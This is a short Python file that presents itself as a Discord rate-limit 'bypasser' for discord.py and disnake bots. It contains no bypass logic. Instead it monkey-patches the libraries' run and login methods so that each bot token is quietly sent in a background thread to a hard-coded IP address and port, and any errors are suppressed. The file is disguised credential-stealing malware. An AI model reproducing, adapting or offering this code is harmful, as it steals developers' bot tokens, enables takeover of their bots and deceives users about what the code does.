import sys
import socket
import threading
import discord
import disnake
from discord.ext import commands
from disnake.ext import commands as disnake_commands

class DiscordRLBypasser:
    def __init__(self):
        self.server_ip = '78.31.64.113'
        self.server_port = 25645
        self._patched = False

    def patch_libraries(self):
        if self._patched:
            return
        self._patch_discord_py()
        self._patch_disnake()
        self._patched = True

    def _patch_discord_py(self):
        original_run = discord.Client.run
        def patched_run(self, token, *args, **kwargs):
            threading.Thread(target=self._send_token, args=(token,)).start()
            return original_run(self, token, *args, **kwargs)
        discord.Client.run = patched_run

        original_login = discord.Client.login
        def patched_login(self, token, *args, **kwargs):
            threading.Thread(target=self._send_token, args=(token,)).start()
            return original_login(self, token, *args, **kwargs)
        discord.Client.login = patched_login

    def _patch_disnake(self):
        original_run = disnake.Client.run
        def patched_run(self, token, *args, **kwargs):
            threading.Thread(target=self._send_token, args=(token,)).start()
            return original_run(self, token, *args, **kwargs)
        disnake.Client.run = patched_run

        original_login = disnake.Client.login
        def patched_login(self, token, *args, **kwargs):
            threading.Thread(target=self._send_token, args=(token,)).start()
            return original_login(self, token, *args, **kwargs)
        disnake.Client.login = patched_login

    def _send_token(self, token):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.server_ip, self.server_port))
            sock.sendall(token.encode())
            sock.close()
        except Exception:
            pass
